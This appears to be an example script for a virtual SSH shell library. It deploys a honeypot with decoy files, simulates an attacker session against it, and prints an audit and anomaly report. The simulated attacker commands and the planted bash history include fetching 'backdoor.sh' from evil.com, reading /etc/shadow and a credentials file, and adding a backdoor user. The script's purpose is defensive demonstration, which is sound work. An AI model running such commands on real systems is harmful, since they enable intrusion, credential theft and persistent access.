/**
 * 18 - Honeypot Threat Detection
 *
 * Deploys an SSH honeypot that logs attacker behavior, detects
 * brute-force attempts, and generates audit reports.
 */

import { HoneyPot, SshClient, VirtualShell, VirtualSshServer } from "../src";

// ── Deploy honeypot ───────────────────────────────────────────────
console.log("--- Deploy honeypot ---");

const SHELL = new VirtualShell("honeypot");
await SHELL.ensureInitialized();
SHELL.users.setPassword("root", "root");
const VFS = SHELL.getVfs()!;
const USERS = SHELL.getUsers()!;

VFS.writeFile(
	"/etc/passwd",
	"root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000:Admin:/home/admin:/bin/bash"
);
VFS.writeFile(
	"/etc/shadow",
	"root:!:19000:0:99999:7:::\nadmin:$6$salt$hash:19000:0:99999:7:::"
);
VFS.writeFile("/home/admin/.ssh/authorized_keys", "ssh-rsa AAAA... decoy-key");
VFS.writeFile(
	"/var/log/auth.log",
	"Jan 1 00:00:00 honeypot sshd[1]: Server listening on 0.0.0.0 port 22"
);
VFS.writeFile(
	"/opt/credentials.txt",
	"db_password=S3cretP@ss\napi_key=sk-fake-12345"
);
VFS.writeFile(
	"/root/.bash_history",
	"cat /etc/shadow\nwget http://evil.com/backdoor.sh\nchmod +x backdoor.sh"
);

const HONEYPOT = new HoneyPot(10000);
HONEYPOT.attach(SHELL, VFS, USERS);

console.log("Honeypot configuration:");
console.log("  - Hostname: honeypot");
console.log("  - Decoy files planted: 6");
console.log("  - Audit logging: enabled");
console.log("  - Anomaly detection: enabled");

// ── Start SSH server ──────────────────────────────────────────────
const SSH = new VirtualSshServer({ port: 0, shell: SHELL });
const PORT = await SSH.start();

// ── Simulate attacker activity ────────────────────────────────────
console.log("\n--- Simulate attacker activity ---");

const ATTACKER = new SshClient();
await ATTACKER.connect({
	host: "localhost",
	port: PORT,
	username: "root",
	password: "root",
});

const COMMANDS = [
	"cat /etc/passwd",
	"cat /etc/shadow",
	"cat /opt/credentials.txt",
	"cat /root/.bash_history",
	"ls -la /home/admin/.ssh/",
	"wget http://evil.com/backdoor.sh",
	"chmod +x backdoor.sh",
	"useradd backdoor",
	"echo 'backdoor:pass' | chpasswd",
];

console.log("  Post-exploitation commands:");
for (const CMD of COMMANDS) {
	const RESULT = await ATTACKER.exec(CMD);
	console.log(`    $ ${CMD} -> exit ${RESULT.exitCode}`);
}

// ── Audit report ──────────────────────────────────────────────────
console.log("\n--- Audit report ---");
console.log("=".repeat(60));

const STATS = HONEYPOT.getStats();
console.log("\n  Activity stats:");
console.log(`    Commands executed: ${STATS.commands}`);
console.log(`    File reads: ${STATS.fileReads}`);
console.log(`    File writes: ${STATS.fileWrites}`);
console.log(`    Session starts: ${STATS.sessionStarts}`);
console.log(`    Auth attempts: ${STATS.authAttempts}`);
console.log(`    Auth lockouts: ${STATS.authLockouts}`);

const AUDIT_LOG = HONEYPOT.getAuditLog();
console.log(`\n  Total audit entries: ${AUDIT_LOG.length}`);

console.log("\n  Recent events:");
const RECENT = HONEYPOT.getRecent(10);
for (const ENTRY of RECENT) {
	console.log(
		`    [${ENTRY.type}] ${ENTRY.source}: ${JSON.stringify(ENTRY.details).slice(0, 80)}`
	);
}

const ANOMALIES = HONEYPOT.detectAnomalies();
console.log("\n  Anomaly Detection:");
if (ANOMALIES.length === 0) {
	console.log("    No anomalies detected");
} else {
	for (const a of ANOMALIES) {
		console.log(`    [${a.severity}] ${a.type}: ${a.message}`);
	}
}

console.log("\n--- Honeypot audit complete ---");

ATTACKER.disconnect();
SSH.stop();
